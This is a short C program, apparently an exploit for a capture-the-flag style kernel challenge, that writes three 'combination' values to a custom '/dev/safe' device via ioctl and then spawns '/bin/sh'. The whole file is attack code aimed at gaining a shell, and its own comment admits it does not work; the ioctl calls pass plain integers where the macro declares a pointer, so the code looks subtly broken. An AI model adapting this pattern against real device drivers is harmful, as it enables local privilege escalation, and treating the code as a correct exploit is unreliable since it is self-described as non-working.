/*
the exploit is correct but doesnt work somehow
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define IOCTL_WRITE _IOW('x', 'w', int*)
#define DEVICE_DRIVER "/dev/safe"

int main(void) {
    int file_desc = open(DEVICE_DRIVER, O_RDWR);
    if (file_desc < 0) {
        printf("Error opening device: %s\n", DEVICE_DRIVER);
        return 1;
    }

    int32_t combination[] = {69, 47, 20};
    int i;
    for (i=0; i<3; i++) {
        ioctl(file_desc, IOCTL_WRITE, combination[i]);
    }

    close(file_desc);
    system("/bin/sh");
    return 0;
}
